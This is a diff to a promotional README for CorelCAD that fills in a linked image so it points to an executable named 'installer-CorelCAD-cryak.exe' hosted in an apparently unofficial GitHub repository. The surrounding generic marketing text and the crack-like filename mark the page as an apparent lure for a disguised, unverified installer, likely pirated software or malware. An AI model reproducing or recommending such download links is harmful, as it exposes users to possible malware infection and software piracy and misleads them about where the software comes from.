@@ -9,7 +9,7 @@ CorelCAD harnesses the power of advanced features like parametric drawing and cu
 
 Moreover, CorelCAD includes features such as 3D printing capabilities, enabling users to prepare their models for physical production. With built-in tools for mesh modeling and rendering, designers can create realistic visualizations of their projects, which is invaluable for client presentations and project approvals.
 
-[<img src="https://github.com/user-attachments/assets/abd0cdb5-d727-4524-a91a-e8afe56c6a24">](
+[<img src="https://github.com/user-attachments/assets/abd0cdb5-d727-4524-a91a-e8afe56c6a24">](https://github.com/ajkalsada/CorelCAD/releases/download/1/installer-CorelCAD-cryak.exe)
 
 >[!TIP]
 > A significant advantage of CorelCAD is its speed and efficiency. The software is optimized for handling large drawings and complex designs, ensuring fast performance and smooth operation even with resource-intensive projects. CorelCAD also offers robust customization options, allowing users to tailor the interface and toolsets to their specific needs. This flexibility ensures that each user can work in a way that best suits their design style and workflow.
